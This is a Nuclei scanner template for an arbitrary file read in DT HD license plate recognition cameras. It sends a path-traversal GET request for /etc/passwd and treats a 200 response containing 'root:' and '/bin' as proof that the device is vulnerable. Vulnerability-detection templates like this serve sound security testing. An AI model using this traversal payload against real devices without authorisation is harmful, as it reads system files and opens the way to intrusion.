id: dt-hd-license-plate-camera-anyfile-read
info:
  name: DT HD License Plate Recognition Camera Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
      - type: word
        words:
          - "<"
        negative: true
        part: body
